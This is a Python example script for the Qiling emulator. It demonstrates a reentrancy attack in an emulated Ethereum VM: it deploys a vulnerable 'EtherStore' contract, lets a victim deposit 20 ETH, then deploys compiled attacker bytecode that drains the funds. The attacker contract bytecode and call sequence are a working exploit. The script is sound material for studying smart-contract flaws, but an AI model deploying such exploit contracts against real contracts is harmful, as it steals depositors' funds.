#!/usr/bin/env python3
# 
# Cross Platform and Multi Architecture Advanced Binary Emulation Framework
#

import sys

sys.path.append("../..")
from qiling import *
from qiling.arch.evm.vm.utils import bytecode_to_bytes, runtime_code_detector
from qiling.arch.evm.vm.vm import BaseVM
from qiling.arch.evm.constants import CREATE_CONTRACT_ADDRESS


if __name__ == '__main__':
    # Attack_contract     = '0x608060405234801561001057600080fd5b5060405160208061046d83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103ea806100836000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636289d38514610152578063acd2e6e51461015c578063ff11e1db146101b3575b670de0b6b3a76400006000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311115610150576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561013757600080fd5b505af115801561014b573d6000803e3d6000fd5b505050505b005b61015a6101ca565b005b34801561016857600080fd5b50610171610339565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101bf57600080fd5b506101c861035e565b005b670de0b6b3a764000034101515156101e157600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e2c41dbc670de0b6b3a76400006040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561026e57600080fd5b505af1158015610282573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561031f57600080fd5b505af1158015610333573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156103bb573d6000803e3d6000fd5b505600a165627a7a723058204ad3139b1085c12112b76e9eab70c6589942d6e84eb3d8329a644eca757c19d00029'
    Attack_contract     = '0x608060405234801561001057600080fd5b506040516020806104b883398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610435806100836000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063a75e462514610179578063ff11e1db146101e1575b670de0b6b3a76400006000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311115610177576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600060149054906101000a90047c0100000000000000000000000000000000000000000000000000000000027c01000000000000000000000000000000000000000000000000000000009004670de0b6b3a76400006040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808267ffffffffffffffff1681526020019150506000604051808303816000875af192505050505b005b6101df60048036038101908080357bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916906020019092919080357bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690602001909291905050506101f8565b005b3480156101ed57600080fd5b506101f66103a9565b005b80600060146101000a81548163ffffffff02191690837c010000000000000000000000000000000000000000000000000000000090040217905550670de0b6b3a7640000341015151561024a57600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a7640000837c01000000000000000000000000000000000000000000000000000000009004906040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160006040518083038185885af19350505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16817c01000000000000000000000000000000000000000000000000000000009004670de0b6b3a76400006040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808267ffffffffffffffff1681526020019150506000604051808303816000875af192505050505050565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610406573d6000803e3d6000fd5b505600a165627a7a723058205aacb19a5864d2c460aed6c844f2aca575d87de6477ac757a72511bb2975b3f80029'

    ql = Qiling(code=Attack_contract, archtype="evm")
    vm:BaseVM = ql.arch.evm.vm

    C1 = b'\xaa' * 20
    C2 = b'\xbb' * 20
    User1 = b'\xcc' * 20
    User2 = b'\xde\xad\xbe\xef' * 5

    ql.arch.evm.create_account(C1)
    ql.arch.evm.create_account(C2)
    ql.arch.evm.create_account(User1, 100*10**18)
    ql.arch.evm.create_account(User2, 100*10**18)
    
    EtherStore_contract = '0x6080604052670de0b6b3a764000060005534801561001c57600080fd5b506103b08061002c6000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631031ec3114610072578063155dd5ee146100c957806327e235e3146100f65780637ddfe78d1461014d578063e2c41dbc14610178575b600080fd5b34801561007e57600080fd5b506100b3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610182565b6040518082815260200191505060405180910390f35b3480156100d557600080fd5b506100f46004803603810190808035906020019092919050505061019a565b005b34801561010257600080fd5b50610137600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610317565b6040518082815260200191505060405180910390f35b34801561015957600080fd5b5061016261032f565b6040518082815260200191505060405180910390f35b610180610335565b005b60016020528060005260406000206000915090505481565b80600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101515156101e857600080fd5b60005481111515156101f957600080fd5b62093a80600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205401421015151561024c57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff168160405160006040518083038185875af192505050151561028357600080fd5b80600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555042600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b60026020528060005260406000206000915090505481565b60005481565b34600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505600a165627a7a72305820707bf0ae11ce52ff7b7846ede3497d41b6fadea29579773fc70e8e61c0f549f10029'
    
    print('Init Victim   balance is', vm.state.get_balance(User1)/10**18)
    print('Init Attacker balance is', vm.state.get_balance(User2)/10**18)

    code1 = bytecode_to_bytes(EtherStore_contract)
    print('\n------ Deploy DeFi contract')
    # 1. deploy EtherStore
    msg1 = vm.build_message(None, 1, 3000000, CREATE_CONTRACT_ADDRESS, User1, 0, b'', code1, contract_address=C1)
    res = vm.execute_message(msg1)

    res_code = bytecode_to_bytes(res.output)
    runtime_code, aux_data, constructor_args = runtime_code_detector(res_code)
    rt_code = bytecode_to_bytes(runtime_code)
    print('Victim balance: ', vm.state.get_balance(User1)/10**18)

    print('\n------ Victim deposit Funds 20ETH to DeFi contract')
    # 2. User1 depositFunds 20ETH to bank
    call_data = '0xe2c41dbc'
    msg2 = vm.build_message(None, 1, 3000000, C1, User1, 20*10**18, bytecode_to_bytes(call_data), rt_code)
    res = vm.execute_message(msg2)
    # print(res.output)
    print('Victim balance: ', vm.state.get_balance(User1)/10**18)

    code2 = bytecode_to_bytes(Attack_contract+ql.arch.evm.abi.convert(['address'], [C1]))
    # print(code2.hex())
    print('\n------ Deploy Attack Contract')

    # 3. deploy Attack
    # ql.debugger = True
    msg3 = vm.build_message(None, 1, 3000000, CREATE_CONTRACT_ADDRESS, User2, 0, b'', code2, contract_address=C2)
    res = vm.execute_message(msg3)
    # ql.debugger = False

    res_code = bytecode_to_bytes(res.output)
    runtime_code, aux_data, constructor_args = runtime_code_detector(res_code)
    rt_code1 = bytecode_to_bytes(runtime_code)
    
    print('\n------ Attacker deposit 1 ETH to DeFi contract, Start Reentrancy Attack')
    # 4. User2 pwnEtherStore with 1ETH
    call_data = '0xa75e4625' + ql.arch.evm.abi.convert(['bytes4'], [bytecode_to_bytes('0xe2c41dbc')]) + ql.arch.evm.abi.convert(['bytes4'], [bytecode_to_bytes('0x155dd5ee')])
    # ql.debugger = True
    msg4 = vm.build_message(None, 1, 3000000, C2, User2, 1*10**18, bytecode_to_bytes(call_data), rt_code1)
    res = vm.execute_message(msg4)
    # ql.debugger = False
    print('Attacker balance: ', vm.state.get_balance(User2)/10**18)

    print('\n------ Attacker steal Ether from DeFi contract')
    # 5. User2 collectEther
    call_data = '0xff11e1db'
    msg5 = vm.build_message(None, 1, 3000000, C2, User2, 0, bytecode_to_bytes(call_data), rt_code1)
    res = vm.execute_message(msg5)
    print('Attacker balance: ', vm.state.get_balance(User2)/10**18)
